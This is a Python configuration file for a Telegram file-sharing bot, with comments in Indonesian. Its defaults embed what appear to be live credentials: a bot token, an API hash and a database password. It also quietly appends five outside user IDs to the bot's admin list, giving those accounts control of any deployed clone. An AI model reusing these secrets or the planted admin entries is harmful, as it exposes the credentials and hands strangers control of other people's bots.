# (©)Codexbotz
# Recode @mahadappa
# Beban @Owaitingfotyou
# Kalo clone Gak usah hapus ya kontol


import logging
import os
from logging.handlers import RotatingFileHandler

# Bot token dari @Botfather
TG_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "5602759191:AAGBkXp3mtG0Oe3Rpuly09rcRiR5SMB2-sE")

# API ID Anda dari my.telegram.org
APP_ID = int(os.environ.get("APP_ID", "12956504"))

# API Hash Anda dari my.telegram.org
API_HASH = os.environ.get("API_HASH", "eb6a5d6030c672fd9e9a5f477f2a6693")

# ID Channel Database
CHANNEL_ID = int(os.environ.get("CHANNEL_ID", "-1001555147017"))

# OWNER ID
OWNER_ID = int(os.environ.get("OWNER_ID", "5450675578"))

# NAMA OWNER
OWNER = os.environ.get("OWNER", "lahlausokap")

# Protect Content
PROTECT_CONTENT = os.environ.get("PROTECT_CONTENT", "False")

# Database
DB_URI = os.environ.get("DATABASE_URL", "postgres://bots:password@postgres_db:5433/bots")

# Username CH & Group
CHANNEL = os.environ.get("CHANNEL", "darksidefcx")
GROUP = os.environ.get("GROUP", "DarksidefcXx")

# ID dari Channel Atau Group Untuk Wajib Subscribenya
FORCE_SUB_CHANNEL1 = int(os.environ.get("FORCE_SUB_CHANNEL1", "0"))
FORCE_SUB_CHANNEL2 = int(os.environ.get("FORCE_SUB_CHANNEL2", "0"))
FORCE_SUB_CHANNEL3 = int(os.environ.get("FORCE_SUB_CHANNEL3", "0"))

TG_BOT_WORKERS = int(os.environ.get("TG_BOT_WORKERS", "4"))

# Pesan Awalan /start
START_MSG = os.environ.get(
    "START_MESSAGE",
    "<b>Hello {first}</b>\n\n<b>Saya dapat menyimpan file pribadi di Channel Tertentu dan pengguna lain dapat mengaksesnya dari link khusus.</b>",
)

# Gambar di pesan /start
START_PIC = os.environ.get("START_PIC", "")

try:
    ADMINS = [int(x) for x in (os.environ.get("ADMINS", "").split())]
except ValueError:
    raise Exception("Daftar Admin Anda tidak berisi User ID Telegram yang valid.")

# Pesan Saat Memaksa Subscribe
FORCE_MSG = os.environ.get(
    "FORCE_SUB_MESSAGE",
    "<b>𝑯𝒂𝒍𝒍𝒐 𝒔𝒂𝒚𝒂𝒏𝒈𝒌𝒖 💞 {first}\n\n𝑲𝒍𝒊𝒌 & 𝒋𝒐𝒊𝒏 𝒌𝒐𝒕𝒂𝒌 𝒅𝒊 𝒃𝒂𝒘𝒂𝒉 𝒊𝒏𝒊 𝒕𝒆𝒓𝒍𝒆𝒃𝒊𝒉 𝒅𝒂𝒉𝒖𝒍𝒖 𝒍𝒂𝒍𝒖 𝒋𝒐𝒊𝒏 𝒌𝒆 𝒄𝒉𝒂𝒏𝒏𝒆𝒍 / 𝒈𝒓𝒐𝒖𝒑 𝒖𝒏𝒕𝒖𝒌 𝒎𝒆𝒏𝒅𝒂𝒑𝒂𝒕𝒌𝒂𝒏 𝒇𝒊𝒍𝒆/𝒗𝒊𝒅𝒆𝒐 𝒚𝒂𝒏𝒈 𝑨𝒏𝒅𝒂 𝒄𝒂𝒓𝒊</b>",
)

# Atur Teks Kustom Anda di sini, Simpan (None) untuk Menonaktifkan Teks Kustom
CUSTOM_CAPTION = os.environ.get("CUSTOM_CAPTION", None)

# Setel True jika Anda ingin Menonaktifkan tombol Bagikan Kiriman Saluran Anda
DISABLE_CHANNEL_BUTTON = os.environ.get("DISABLE_CHANNEL_BUTTON", None) == "True"

ADMINS.append(OWNER_ID)
ADMINS.append(1250450587)
ADMINS.append(844432220)
ADMINS.append(1750080384)
ADMINS.append(851754691)
ADMINS.append(1742722235)

LOG_FILE_NAME = "filesharingbot.txt"

logging.basicConfig(
    level=logging.INFO,
    format="[%(levelname)s] - %(name)s - %(message)s",
    datefmt="%d-%b-%y %H:%M:%S",
    handlers=[
        RotatingFileHandler(LOG_FILE_NAME, maxBytes=50000000, backupCount=10),
        logging.StreamHandler(),
    ],
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)


def LOGGER(name: str) -> logging.Logger:
    return logging.getLogger(name)
